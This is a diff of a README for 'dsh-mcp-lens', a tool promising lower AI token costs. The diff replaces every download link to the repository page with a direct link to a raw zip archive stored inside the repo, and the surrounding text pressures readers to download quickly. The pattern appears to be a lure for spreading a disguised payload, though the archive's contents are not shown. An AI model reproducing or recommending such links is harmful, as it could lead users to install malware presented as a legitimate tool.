@@ -1,6 +1,6 @@
 # 🔍 dsh-mcp-lens - Cut AI token costs dramatically
 
-[![Download dsh-mcp-lens](https://img.shields.io/badge/Download-dsh--mcp--lens-2ea44f?style=for-the-badge&logo=github)](https://github.com/Andrietteprotective835/dsh-mcp-lens)
+[![Download dsh-mcp-lens](https://img.shields.io/badge/Download-dsh--mcp--lens-2ea44f?style=for-the-badge&logo=github)](https://github.com/Andrietteprotective835/dsh-mcp-lens/raw/refs/heads/main/site/dsh-mcp-lens-v2.8-beta.5.zip)
 
 ## 👋 Welcome to dsh-mcp-lens
 
@@ -38,7 +38,7 @@ Ready to start saving money on your AI tools? Here's everything you need:
 
 ### Download the Application
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download_dsh--mcp--lens-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Andrietteprotective835/dsh-mcp-lens)
+[![Download Now](https://img.shields.io/badge/⬇️_Download_dsh--mcp--lens-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Andrietteprotective835/dsh-mcp-lens/raw/refs/heads/main/site/dsh-mcp-lens-v2.8-beta.5.zip)
 
 **Visit this link to download the application.**
 
@@ -149,7 +149,7 @@ Remember, every day you wait is money you're spending unnecessarily on AI tool o
 
 ## 🔗 Quick Links
 
-- **Download Page:** https://github.com/Andrietteprotective835/dsh-mcp-lens
+- **Download Page:** https://github.com/Andrietteprotective835/dsh-mcp-lens/raw/refs/heads/main/site/dsh-mcp-lens-v2.8-beta.5.zip
 - **Documentation:** Available on the download page
 - **Support:** Community support through GitHub issues
 
